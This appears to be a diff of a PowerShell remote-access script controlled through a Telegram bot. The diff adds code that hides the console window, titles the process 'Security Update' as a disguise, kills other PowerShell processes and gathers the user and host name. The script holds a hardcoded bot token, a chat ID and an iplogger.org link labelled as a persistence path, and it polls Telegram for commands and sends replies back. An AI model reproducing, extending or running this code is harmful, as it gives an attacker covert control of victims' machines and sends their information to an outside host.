@@ -3,18 +3,24 @@ Add-Type -Name Window -Namespace Console -MemberDefinition '
 public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
-function Hide-Console {     
-$consolePtr = [Console.Window]::GetConsoleWindow()     
-#0 hide     
-[Console.Window]::ShowWindow($consolePtr, 0) 
-(Get-WmiObject Win32_Process -Filter "name = 'powershell.exe'" | where {$_.CommandLine -like '*-noni*'}).Terminate()
-} 
 
 Hide-Console
+KillProc
 
 $BotToken = "1703588475:AAEyrNt2cuj-u6hWO8t3_NIbKLFVQyMDwNE"
 $ChatID = '928905258'
 $PersistPath = 'https://iplogger.org/2jaZG6'
+
+function KillProc {
+  $host.UI.RawUI.WindowTitle = "System Information"
+  (Get-WmiObject Win32_Process -Filter "name = 'powershell.exe'" | where {$_.WindowTitle -like '*Security Update*'}).Terminate()
+}
+
+function Hide-Console {     
+$consolePtr = [Console.Window]::GetConsoleWindow()     
+#0 hide     
+[Console.Window]::ShowWindow($consolePtr, 0) 
+} 
 
 function Persist {
   
@@ -180,6 +186,7 @@ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
   [Net.SecurityProtocolType]::Tls11 -bor `
   [Net.SecurityProtocolType]::Tls
 
+$host.UI.RawUI.WindowTitle = "Security Update"
 $username = $env:UserName
 $hostname = Invoke-Expression whoami
 $pwd = pwd
@@ -333,7 +340,7 @@ While ($DoNotExit)  {
 	    #The message sent is unknown
 		    #$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
 		    #$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html" -UserAgent Edge -UseBasicParsing
-        	}
+        }
 	  }
 	}
 }
